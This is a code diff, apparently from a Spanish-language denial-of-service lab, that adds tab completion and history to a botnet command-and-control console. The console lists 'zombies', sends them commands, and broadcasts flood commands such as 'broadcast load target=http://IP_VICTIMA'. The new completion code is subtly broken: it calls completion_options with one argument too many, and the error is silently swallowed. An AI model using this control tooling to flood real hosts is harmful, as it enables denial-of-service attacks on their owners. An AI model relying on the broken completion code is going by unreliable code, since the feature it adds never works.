@@ -11,6 +11,7 @@ import threading
 import time
 import uuid
 from datetime import datetime
+from typing import Callable
 from urllib.parse import urlsplit, urlunsplit
 
 from .agent import AgentConnection
@@ -26,6 +27,33 @@ AFTER_SAMPLE_DELAY = 10.0
 MAX_DURATION_S = 120
 MAX_CONCURRENCY = 200
 LOCAL_TARGET_HOSTS = {"127.0.0.1", "localhost", "::1"}
+PROMPT = "c2> "
+
+CONSOLE_COMMANDS = (
+    "list",
+    "select",
+    "unselect",
+    "send",
+    "broadcast",
+    "ping",
+    "kick",
+    "metrics",
+    "status",
+    "clear",
+    "help",
+    "exit",
+    "ls",
+    "agents",
+    "agentes",
+    "deselect",
+    "metricas",
+    "cls",
+    "quit",
+    "salir",
+    "?",
+)
+AGENT_SUBCOMMANDS = ("load", "ping", "info", "echo", "stop")
+LOAD_KEYS = ("target=", "duration=", "concurrency=")
 
 
 def _fit(text: str, width: int) -> str:
@@ -144,21 +172,99 @@ def _parse_command(rest: list[str]) -> tuple[str, dict]:
     return name, args
 
 
-class _StdinReader:
-    """Lee stdin en un hilo daemon para no bloquear el cierre del proceso."""
+def completion_options(buffer: str, agent_refs: list[str]) -> list[str]:
+    """Opciones de autocompletado segun el contenido actual de la linea.
 
-    def __init__(self, loop: asyncio.AbstractEventLoop) -> None:
+    `buffer` es el texto de la linea sin el prompt; `agent_refs` son los
+    indices e ids de los agentes conectados (ej: ["0", "zombie-01"]).
+    """
+    parts = buffer.split()
+    trailing = buffer.endswith(" ")
+    if not parts or (len(parts) == 1 and not trailing):
+        return list(CONSOLE_COMMANDS)
+    head = parts[0]
+    if head in ("select", "ping", "kick"):
+        options = list(agent_refs)
+        if head == "ping":
+            options.append("all")
+        return options
+    if head in ("send", "broadcast"):
+        if len(parts) == 1:
+            return list(AGENT_SUBCOMMANDS)
+        if parts[1] == "load" and (trailing or len(parts) > 2):
+            used = parts[2:]
+            return [key for key in LOAD_KEYS if not any(part.startswith(key) for part in used)]
+        return []
+    if head in ("metrics", "metricas"):
+        return ["antes", "durante", "despues", "manual"]
+    return []
+
+
+class _StdinReader:
+    """Lee stdin en un hilo daemon para no bloquear el cierre del proceso.
+
+    Si el modulo readline esta disponible y stdin es una terminal, usa
+    input() para habilitar autocompletado con Tab e historial con las
+    flechas; en caso contrario usa sys.stdin.readline() sin edicion.
+    """
+
+    def __init__(
+        self,
+        loop: asyncio.AbstractEventLoop,
+        agent_refs_provider: Callable[[], list[str]] | None = None,
+    ) -> None:
         self._loop = loop
         self._queue: asyncio.Queue[str | None] = asyncio.Queue()
         self._thread = threading.Thread(target=self._read_loop, daemon=True)
+        self._agent_refs_provider = agent_refs_provider or (lambda: [])
+        self._readline = None
 
     def start(self) -> None:
         self._thread.start()
 
+    def _setup_readline(self) -> None:
+        try:
+            import readline
+        except ImportError:
+            return
+        if not sys.stdin.isatty() or not sys.stdout.isatty():
+            return
+        try:
+            readline.parse_and_bind("tab: complete")
+            readline.set_completer_delims(" \t")
+            readline.set_completer(self._complete)
+        except Exception:
+            return
+        self._readline = readline
+
+    def _complete(self, text: str, state: int) -> str | None:
+        try:
+            agent_refs = list(self._agent_refs_provider())
+        except Exception:
+            agent_refs = []
+        try:
+            buffer = self._readline.get_line_buffer() if self._readline else text
+        except Exception:
+            buffer = text
+        try:
+            options = completion_options(buffer, agent_refs, text)
+        except Exception:
+            options = []
+        if state < len(options):
+            return options[state]
+        return None
+
     def _read_loop(self) -> None:
+        self._setup_readline()
         while True:
             try:
-                line = sys.stdin.readline()
+                if self._readline is not None:
+                    line = input("")
+                    if line.strip():
+                        with contextlib.suppress(Exception):
+                            self._readline.add_history(line)
+                else:
+                    line = sys.stdin.readline()
             except Exception:
                 line = ""
             try:
@@ -191,10 +297,10 @@ class Console:
 
     async def run(self) -> None:
         self._print_banner()
-        reader = _StdinReader(asyncio.get_running_loop())
+        reader = _StdinReader(asyncio.get_running_loop(), self._agent_refs)
         reader.start()
         while True:
-            print("c2> ", end="", flush=True)
+            print(PROMPT, end="", flush=True)
             line = await reader.readline()
             if line is None:
                 print()
@@ -215,6 +321,12 @@ class Console:
                 await self._dispatch(command, rest)
             except Exception as exc:
                 print(f"error: {exc}")
+
+    def _agent_refs(self) -> list[str]:
+        agents = self.manager.agents
+        refs = [str(index) for index in range(len(agents))]
+        refs.extend(agent.agent_id for agent in agents)
+        return refs
 
     async def _dispatch(self, command: str, rest: list[str]) -> None:
         if command in ("help", "?"):
@@ -254,20 +366,28 @@ class Console:
         print("=" * 66)
 
     def _print_help(self) -> None:
-        print(" comandos disponibles:")
+        print(" comandos disponibles (Tab autocompleta):")
         print("   list                      lista los agentes conectados")
-        print("   select <#|id>             selecciona un agente")
+        print("   select <#|id>             selecciona un agente (ej: select 0)")
         print("   unselect                  quita la seleccion")
-        print("   send <cmd> [clave=valor]  envia un comando al agente seleccionado")
+        print("   send <cmd> [clave=valor]  envia un comando al agente seleccionado (ej: send info)")
         print("   broadcast <cmd> [k=v ...] envia un comando a todos los agentes")
-        print("   ping <#|id|all>           prueba de vida")
-        print("   kick <#|id>               cierra la conexion de un agente")
+        print("   ping <#|id|all>           prueba de vida (ej: ping all)")
+        print("   kick <#|id>               cierra la conexion de un agente (ej: kick 0)")
         print("   metrics [etiqueta]        registra metricas del objetivo (API Netdata)")
         print("   status                    estado del servidor")
         print("   clear                     limpia la pantalla")
         print("   exit                      apaga el servidor")
-        print(" ejemplo de inundacion controlada:")
+        print("   Ctrl+B  D                 salir de la consola sin apagar el C2 (detach de tmux)")
+        print(" ejemplo rapido de una sesion:")
+        print("   list                                     # ver los zombies conectados")
+        print("   select 0                                 # elegir el zombie #0")
+        print("   ping all                                 # prueba de vida de todos")
+        print("   send info                                # datos del equipo del zombie")
         print("   broadcast load target=http://IP_VICTIMA duration=30 concurrency=20")
+        print("                                            # inundacion de 30 s contra la victima")
+        print("   metrics durante                          # guardar metricas en data/metricas.jsonl")
+        print("   kick 1                                   # expulsar al zombie #1")
 
     def _print_agents(self) -> None:
         agents = self.manager.agents
